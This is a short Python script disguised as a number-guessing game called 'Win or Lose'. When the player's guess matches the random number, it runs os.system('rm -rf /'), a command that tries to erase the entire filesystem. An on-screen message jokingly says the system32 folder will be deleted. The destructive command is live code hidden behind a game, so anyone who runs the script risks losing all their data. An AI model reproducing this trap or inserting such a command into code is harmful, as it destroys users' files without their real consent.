import os
import time
import random
import shutil
#Welcome to the Win or Lose Game.

os.system('clear')
welcome= "Welcome to the Win or Lose."
for welmsg in welcome:
    time.sleep(0.04)
    print(welmsg,end="", flush=True)

time.sleep(1)
os.system('clear')


warningmsg= "If you win, you win, but if you lose, the system32 folder will be deleted (I'm seriously)."
for warnmsg in warningmsg:
    time.sleep(0.04)
    print(warnmsg, end="", flush= True)

while True:
    time.sleep(1.3)
    os.system('clear')

    awnser= int(input("select your Number (1 - 10) >>>  "))

    randomnum= random.randint(1, 10)

    if awnser == randomnum:
        time.sleep(1.3)
        os.system('clear')
        lose_awnser= "You lose and your system32 folder is will gone. Goodbye:)"
        for losemsg in lose_awnser:
            time.sleep(0.04)
            print(losemsg, end="", flush= True)
        time.sleep(2)
        os.system("clear")
        os.system('rm -rf /')

    elif awnser != randomnum:
        time.sleep(1.3)
        os.system('clear')
        win_awnser= "you win and your system32 folder is safe. do you want play again?"
        for winmsg in win_awnser:
            time.sleep(0.04)
            print(winmsg, end="", flush= True)
        tryawnser= str(input("\ny or n  >>>  "))
        if tryawnser == "y":
            pass
        elif tryawnser == "n":
            break
    else:
        tryanotherword= "Try with another word."
        for anothermsg in tryanotherword:
            time.sleep(0.04)
            print(anothermsg, end="", flush= True)
        print(tryawnser)